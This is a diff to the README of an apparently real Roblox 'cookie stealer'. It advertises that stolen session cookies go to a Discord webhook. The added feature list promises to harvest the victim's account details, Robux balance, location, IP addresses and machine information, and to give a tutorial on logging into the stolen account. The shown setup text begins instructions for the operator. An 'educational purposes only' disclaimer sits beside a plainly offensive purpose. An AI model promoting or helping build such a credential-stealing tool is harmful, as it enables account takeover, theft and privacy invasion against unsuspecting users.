@@ -25,20 +25,35 @@
 
   </a>
 </div>
+    <div align="center">
+        <h2>What's up everybody! I made a Roblox 🍪 Stealer. The cookie will be sent by a Webhooks on Discord.</h2>
+        <p><strong>BEFORE I CONTINUE THIS TOOL WAS MADE FOR EDUCATIONAL PURPOSES ONLY!</strong></p>
+        <h2>Table of Contents 📖</h2>
+        <ul style="list-style-type: none;">
+            <li><a href="feature">Feature</a></li>
+            <li><a href="#setup">1. Install/Setup</a></li>
+            <li><a href="#compile">2. Compile the py file</a></li>
+            <li><a href="#conclusion">3. Conclusion</a></li>
+        </ul>
+    </div>
+    <div id="feature" align="center">
+        <h4>Features Available:</h4>
+        <h4>1. View information about the victim's Roblox account: UserName, Robux balance, Premium status, RAP, and Number of friends.</h4>
+        <h4>2. Roblox Cookie Grabber.</h4>
+        <h4>3. Location: CITY, REGION, COUNTRY (LATITUDE, LONGITUDE).</h4>
+        <h4>4. Public IP and Private IP.</h4>
+        <h4>5. Computer Information: Computer name, processor, RAM, machine architecture, operating system (OS), OS release, OS version, MAC address.</h4>
+        <h4>6. And a little tutorial to know how to access the account.</h4>
+    </div>
 
-<div align="center">
-  <h2>What's up everybody! I made a Roblox 🍪 Stealer. The cookie will be sent by a Webhooks on Discord.</h2>
-  <h2>BEFORE I CONTINUE THIS TOOL WHAS MADE FOR EDUCATIONAL PURPOSES ONLY !</h2>
-  <h2>Table of Contents 📖</h2>
-  <ul>
-    <li><a href="#setup">1. Install/Setup</a></li>
-    <li><a href="#compile">2. Compile the py file</a></li>
-    <li><a href="#conclusion">3. Conclusion</a></li>
-  </ul>
-</div>
+
+
+
+
+
+
 
 <div id="setup" align="center">
-  
   <h1>Setup</h1>
   <h3 id="webhook">WebHook Part.</h3>
    <h1>First, create a server private with nobody.</h1>
